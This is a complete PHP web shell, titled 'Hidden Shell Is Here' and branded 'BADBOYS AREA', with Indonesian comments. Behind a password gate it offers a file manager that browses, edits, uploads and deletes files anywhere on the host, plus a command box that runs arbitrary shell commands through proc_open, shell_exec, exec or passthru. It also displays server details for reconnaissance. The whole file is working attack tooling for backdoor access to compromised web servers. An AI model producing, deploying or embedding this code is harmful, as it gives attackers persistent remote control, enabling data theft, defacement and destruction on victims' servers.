<?php
// --- SETUP DASAR ---
error_reporting(0);
session_start();

// 1. Konfigurasi Kata Sandi dan Tampilan
// HASH untuk password: 'badboys'. GANTI INI DENGAN HASH BARU UNTUK KEAMANAN!
$PASSWORD_HASH = '$2a$12$4je/kMkpmCeyHABLICpjRePNAINbszTVWwgpSGoHBRQSrYsNyRMB.';

// Skema Warna
$NEON_BLUE = '#00BFFF'; // Biru Muda Neon
$DARK_BLUE = '#003355';
$NEON_PINK = '#FF00AA'; // Permissions Color
$ALERT_RED = '#FF4500'; // Actions/Error Color

// --- FUNGSI TAMPILAN LOGIN ---
function display_login_form($error = null) {
    global $NEON_BLUE, $ALERT_RED;
    
    $css_style = '
        body {
            background-color: #000;
            color: ' . $NEON_BLUE . ';
            font-family: \'Consolas\', \'Courier New\', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: url("https://thoidai.org/hellohangker/badboys.png");
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .login-box {
            background-color: rgba(0, 0, 0, 0.9);
            border: 2px solid ' . $NEON_BLUE . ';
            padding: 30px;
            text-align: center;
            box-shadow: 0 0 30px ' . $NEON_BLUE . ';
        }
        h2 { color: #FFF; }
        input[type="password"], input[type="submit"] {
            background-color: #000;
            border: 1px solid ' . $NEON_BLUE . ';
            color: ' . $NEON_BLUE . ';
            padding: 10px;
            margin: 10px 0;
            font-family: inherit;
            width: 90%;
            transition: all 0.3s;
        }
        input[type="submit"] {
            cursor: pointer;
            color: #000;
            background-color: ' . $NEON_BLUE . ';
            border: 1px solid #FFF;
            font-weight: bold;
        }
        .error {
            color: ' . $ALERT_RED . '; 
            font-weight: bold;
        }
    ';

    echo "<!DOCTYPE html><html><head><title>STFVKUP</title><style>{$css_style}</style></head><body>
    <div class='login-box'>
        <h2>BADBOYS AREA</h2>
        " . ($error ? "<p class='error'>$error</p>" : "") . "
        <form method='POST'>
            <input type='password' name='password' placeholder='Enter Password' required autofocus><br>
            <input type='submit' value='Login >>'>
        </form>
    </div>
    </body></html>";
}

// --- LOGIKA OTENTIKASI ---
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], $PASSWORD_HASH)) {
            $_SESSION['authenticated'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Password Salah!";
        }
    }
    display_login_form($login_error ?? null);
    exit; 
}


// --- KODE FILE MANAGER UTAMA DIMULAI SETELAH AUTENTIKASI ---

// Tentukan direktori kerja saat ini (CWD)
$cwd = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());

// Fungsi Helper untuk Path
function safe_path($path) {
    $path = rtrim($path, '/');
    return $path ? $path : '/';
}

// FUNGSI BARU: Mendapatkan izin dalam format Oktal (0755)
function get_octal_perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    
    return substr(sprintf('%o', $perms), -4);
}

// Fungsi Helper untuk Permissions String (rwxrwxrwx)
function get_perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '???-???-???';

    $info = (is_dir($file) ? 'd' : '-');
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

// Fungsi Helper untuk Owner:Group
function get_owner_group($file) {
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $ownerId = @fileowner($file);
        $groupId = @filegroup($file);
        $owner = @posix_getpwuid($ownerId)['name'];
        $group = @posix_getgrgid($groupId)['name'];
        return "$owner:$group";
    }
    return 'N/A';
}

// --- LOGIKA EDIT/VIEW FILE ---
$editing_file = false;
$edit_content = '';
if (isset($_GET['view']) && is_file($cwd . '/' . basename($_GET['view']))) {
    $editing_file = true;
    $edit_target = basename($_GET['view']);
    $edit_content = htmlspecialchars(@file_get_contents($cwd . '/' . $edit_target));
}


// --- AKSI Sederhana (Delete, Rename, Mkdir, Mkfile, Upload, Save Edit, Logout) ---
if (isset($_POST['action'])) {
    $target = safe_path($cwd . '/' . basename($_POST['target'] ?? ''));
    $new_name = isset($_POST['new_name']) ? safe_path($cwd . '/' . basename($_POST['new_name'])) : '';
    
    try {
        switch ($_POST['action']) {
            case 'delete':
                if (is_dir($target)) { @rmdir($target); } else { @unlink($target); }
                break;
            case 'rename':
                @rename($target, $new_name);
                break;
            case 'mkdir':
                @mkdir($new_name);
                break;
            case 'mkfile':
                @file_put_contents($new_name, '');
                break;
            case 'upload':
                if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
                    @move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . basename($_FILES['file']['name']));
                }
                break;
            case 'save_edit':
                $content = $_POST['content'];
                @file_put_contents($target, $content);
                break;
            case 'logout':
                session_destroy();
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
        }
    } catch (\Throwable $e) {
        // ...
    }
    if ($_POST['action'] !== 'save_edit') {
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// --- FUNGSI EKSEKUSI PERINTAH UNIVERSAL ---
function execute_command($cmd) {
    $output = '';
    
    // Prioritas 1: proc_open
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($cmd, $descriptorspec, $pipes, $GLOBALS['cwd']);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            @proc_close($process);
            if (!empty($output)) return $output;
        }
    }
    
    // Prioritas 2: shell_exec
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
        if (!empty($output)) return $output;
    }
    
    // Prioritas 3: exec
    if (function_exists('exec')) {
        $result = array();
        @exec($cmd, $result);
        $output = implode("\n", $result);
        if (!empty($output)) return $output;
    }
    
    // Prioritas 4: passthru
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $output = ob_get_clean();
        if (!empty($output)) return $output;
    }

    return "Fungsi eksekusi (proc_open, shell_exec, exec, passthru) dinonaktifkan atau output kosong.";
}


// --- TAMPILAN HTML/CSS (Gaya Gelap Biru Neon) ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hidden Shell Is Here</title>
    <style>
        body {
            background-color: #000;
            color: <?= $NEON_BLUE ?>;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            margin: 0;
            padding: 10px;
            background-image: url("https://thoidai.org/hellohangker/badboys.png");
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.9);
            padding: 10px;
            min-height: 100vh;
        }
        a { color: <?= $NEON_BLUE ?>; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .info-block, .action-tabs, .file-table, .form-section {
            border: 1px solid <?= $NEON_BLUE ?>;
            margin-bottom: 10px;
            padding: 5px;
            box-shadow: 0 0 5px <?= $NEON_BLUE ?>;
        }
        .header-info span { color: #FFF; font-weight: bold; }
        .file-table table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { 
            padding: 3px 5px; 
            border: none;
            border-bottom: 1px solid #005588;
        }
        .file-table th { background-color: <?= $DARK_BLUE ?>; color: #FFF; }
        .perms { color: <?= $NEON_PINK ?>; }
        .actions a { color: <?= $ALERT_RED ?>; margin-right: 5px; }
        input[type="text"], input[type="submit"], input[type="file"], select, textarea {
            background-color: #000;
            border: 1px solid <?= $NEON_BLUE ?>;
            color: <?= $NEON_BLUE ?>;
            padding: 3px;
            font-family: inherit;
        }
        input[type="submit"] {
            cursor: pointer;
            border-color: <?= $ALERT_RED ?>;
            color: <?= $ALERT_RED ?>;
            background: none;
        }
        .execute-output { border: 1px solid <?= $ALERT_RED ?>; padding: 5px; margin-top: 5px; color: <?= $ALERT_RED ?>; }
        .octal { color: #FFFFFF; font-weight: bold; margin-right: 5px; }
        .dir-row td { background-color: rgba(0, 51, 85, 0.3); } /* Tambahkan sedikit latar belakang untuk direktori */
    </style>
</head>
<body>
<div class="container">

<div class="info-block header-info">
    Uname: <span><?= php_uname() ?></span><br>
    User: <span><?= get_current_user() ?></span> | Group: <span><?= @getmygid() ?></span><br>
    PHP: <span><?= phpversion() ?></span> | Safe Mode: <span><?= ini_get('safe_mode') ? 'ON' : 'OFF' ?></span><br>
    Server IP: <span><?= $_SERVER['SERVER_ADDR'] ?></span> | Your IP: <span><?= $_SERVER['REMOTE_ADDR'] ?></span><br>
    Domains: <span>N/A</span><br>
    HDD: Total: <span>N/A</span> | Free: <span><?= round(@disk_free_space($cwd) / (1024 * 1024 * 1024), 2) ?> GB</span><br>
    PWD: <span><?= htmlspecialchars($cwd) ?></span>
    <form method="POST" style="display: inline-block; float: right;">
        <input type="hidden" name="action" value="logout">
        <input type="submit" value="[ Logout ]" style="color: <?= $ALERT_RED ?>; border-color: <?= $ALERT_RED ?>; margin: 0; padding: 0; background: none;">
    </form>
</div>

<div class="action-tabs" style="text-align: center;">
    <a href="?path=<?= urlencode($cwd) ?>">Home</a> | <a href="#">Process</a> | <a href="#">Eval</a> | <a href="#">CMD</a> | ...
</div>

<?php if ($editing_file): ?>
    <div class="info-block">
        <h3 style="color: <?= $NEON_BLUE ?>;">📝 Edit File: <?= htmlspecialchars($edit_target) ?></h3>
        <form method="POST">
            <input type="hidden" name="action" value="save_edit">
            <input type="hidden" name="target" value="<?= htmlspecialchars($edit_target) ?>">
            <textarea name="content" rows="20" style="width:99.5%; background-color: #000; border: 1px solid <?= $NEON_BLUE ?>; color: #FFF; font-family: inherit;"><?= $edit_content ?></textarea><br>
            <input type="submit" value="Simpan Perubahan">
            <a href="?path=<?= urlencode($cwd) ?>" style="color: <?= $ALERT_RED ?>;">Batal</a>
        </form>
    </div>

<?php else: ?>
    <div class="file-table">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Modify</th>
                    <th>Owner/Group</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // Navigasi ".."
                $parent = safe_path(dirname($cwd));
                if ($cwd !== '/') {
                    echo '<tr class="dir-row">';
                    echo '<td><a href="?path=' . urlencode($parent) . '">.. |</a></td>';
                    echo '<td>dir</td><td>-</td><td>-</td><td class="perms"><span class="octal">0777</span> d-rwx-rwx-rwx</td><td>R T X</td>';
                    echo '</tr>';
                }

                // 1. Ambil dan Pisahkan Direktori dan File
                $contents = array_diff(@scandir($cwd), ['.', '..']);
                $dirs = [];
                $files = [];

                foreach ($contents as $item) {
                    $itemPath = $cwd . '/' . $item;
                    if (is_dir($itemPath)) {
                        $dirs[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }
                
                // Urutkan untuk tampilan yang rapih
                sort($dirs);
                sort($files);

                // 2. Tampilkan Direktori
                foreach ($dirs as $item) {
                    $itemPath = $cwd . '/' . $item;
                    
                    $itemUrl = '?path=' . urlencode($itemPath);
                    $size = 'dir';
                    
                    // Menentukan link aksi
                    $delete_link = 'onclick="if(confirm(\'Hapus ' . htmlspecialchars($item) . ' secara permanen?\')) { document.getElementById(\'delete_target\').value=\'' . htmlspecialchars($item) . '\'; document.getElementById(\'delete_form\').submit(); }"';
                    $rename_link = 'onclick="var n=prompt(\'Ganti nama:\', \'' . htmlspecialchars($item) . '\'); if(n) { document.getElementById(\'rename_target\').value=\'' . htmlspecialchars($item) . '\'; document.getElementById(\'new_name_input\').value=n; document.getElementById(\'rename_form\').submit(); }"';
                    // Direktori tidak memiliki link Edit (E)

                    echo '<tr class="dir-row">';
                    echo '<td><a href="' . $itemUrl . '">' . htmlspecialchars($item) . '</a></td>';
                    echo '<td>' . $size . '</td>';
                    echo '<td>' . date("Y-m-d H:i", @filemtime($itemPath)) . '</td>';
                    echo '<td>' . get_owner_group($itemPath) . '</td>';
                    echo '<td class="perms"><span class="octal">' . get_octal_perms($itemPath) . '</span> ' . get_perms($itemPath) . '</td>';
                    echo '<td class="actions">';
                    echo '<a href="' . $itemUrl . '">R</a> ';
                    echo '<a href="' . $rename_link . '">T</a> ';
                    echo 'E '; // Edit (Disabled for dir)
                    echo 'D '; // Download (Disabled for dir)
                    // Tombol Hapus Eksplisit
                    echo '<a href="#" ' . $delete_link . ' style="color: ' . $ALERT_RED . '; font-weight: bold;">[Hapus]</a>';
                    echo '</td>';
                    echo '</tr>';
                }

                // 3. Tampilkan File
                foreach ($files as $item) {
                    $itemPath = $cwd . '/' . $item;
                    
                    $itemUrl = '?view=' . urlencode($item) . '&path=' . urlencode($cwd);
                    $size = round(@filesize($itemPath) / 1024, 2) . ' KB';
                    
                    // Menentukan link aksi
                    $delete_link = 'onclick="if(confirm(\'Hapus ' . htmlspecialchars($item) . ' secara permanen?\')) { document.getElementById(\'delete_target\').value=\'' . htmlspecialchars($item) . '\'; document.getElementById(\'delete_form\').submit(); }"';
                    $rename_link = 'onclick="var n=prompt(\'Ganti nama:\', \'' . htmlspecialchars($item) . '\'); if(n) { document.getElementById(\'rename_target\').value=\'' . htmlspecialchars($item) . '\'; document.getElementById(\'new_name_input\').value=n; document.getElementById(\'rename_form\').submit(); }"';
                    $edit_link = '?view=' . urlencode($item) . '&path=' . urlencode($cwd);

                    echo '<tr>';
                    echo '<td><a href="' . $itemUrl . '">' . htmlspecialchars($item) . '</a></td>';
                    echo '<td>' . $size . '</td>';
                    echo '<td>' . date("Y-m-d H:i", @filemtime($itemPath)) . '</td>';
                    echo '<td>' . get_owner_group($itemPath) . '</td>';
                    echo '<td class="perms"><span class="octal">' . get_octal_perms($itemPath) . '</span> ' . get_perms($itemPath) . '</td>';
                    echo '<td class="actions">';
                    echo 'R ';
                    echo '<a href="' . $rename_link . '">T</a> ';
                    echo '<a href="' . $edit_link . '">E</a> ';
                    echo 'D '; // Placeholder untuk Download
                    // Tombol Hapus Eksplisit
                    echo '<a href="#" ' . $delete_link . ' style="color: ' . $ALERT_RED . '; font-weight: bold;">[Hapus]</a>';
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </tbody>
        </table>
    </div>

    <form method="POST" id="delete_form" style="display:none;">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="target" id="delete_target">
    </form>

    <form method="POST" id="rename_form" style="display:none;">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="target" id="rename_target">
        <input type="hidden" name="new_name" id="new_name_input">
    </form>

    <div style="margin-top: 20px;">
        <form method="POST" style="display: inline-block;">
            <label>Make File:</label>
            <input type="hidden" name="action" value="mkfile">
            <input type="text" name="new_name" size="15" placeholder="filename">
            <input type="submit" value=">>">
        </form>
        
        <form method="POST" style="display: inline-block;">
            <label>Make Dir:</label>
            <input type="hidden" name="action" value="mkdir">
            <input type="text" name="new_name" size="15" placeholder="dirname">
            <input type="submit" value=">>">
        </form>
        
        <form method="POST" enctype="multipart/form-data" style="display: inline-block;">
            <label>Upload File:</label>
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file">
            <input type="submit" value=">>">
        </form>
    </div>

    <div style="margin-top: 10px;">
        <form method="POST" style="display: inline-block; margin-right: 15px;">
            <label style="color: <?= $ALERT_RED ?>;">Hapus Target:</label>
            <input type="hidden" name="action" value="delete">
            <input type="text" name="target" size="20" placeholder="nama_file_atau_dir">
            <input type="submit" value="[HAPUS] >>" style="color: <?= $ALERT_RED ?>; border-color: <?= $ALERT_RED ?>;">
        </form>
        
        <form method="GET" style="display: inline-block;">
            <label>Change Dir:</label>
            <input type="text" name="path" value="<?= htmlspecialchars($cwd) ?>" size="40">
            <input type="submit" value=">>">
        </form>
    </div>

    <div style="margin-top: 10px;">
        <form method="POST">
            <label>Execute:</label>
            <input type="text" name="cmd" size="60">
            <input type="submit" value=">>">
        </form>
        <?php
        if (isset($_POST['cmd']) && $_POST['cmd'] !== 'logout') {
            $cmd = $_POST['cmd'];
            $output = execute_command($cmd); // Menggunakan fungsi universal
            echo "<pre class='execute-output'>";
            echo htmlspecialchars($output);
            echo "</pre>";
        }
        ?>
    </div>

<?php endif; ?>
</div> </body>
</html>
